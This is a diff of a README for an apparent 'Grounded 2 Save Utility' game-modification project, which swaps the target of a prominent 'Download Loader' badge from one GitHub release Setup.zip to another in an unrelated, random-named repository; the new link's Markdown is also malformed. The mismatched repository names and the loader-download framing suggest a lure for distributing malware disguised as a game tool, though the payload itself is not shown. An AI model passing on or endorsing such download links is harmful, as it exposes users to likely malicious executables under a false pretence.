@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Grounded 2 Save Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Grounded-2-Save-Utility` · Updated: 2026-10-07
 
 **Tags:** `grounded-2` `savegame` `survival` `crafting` `windows`
+
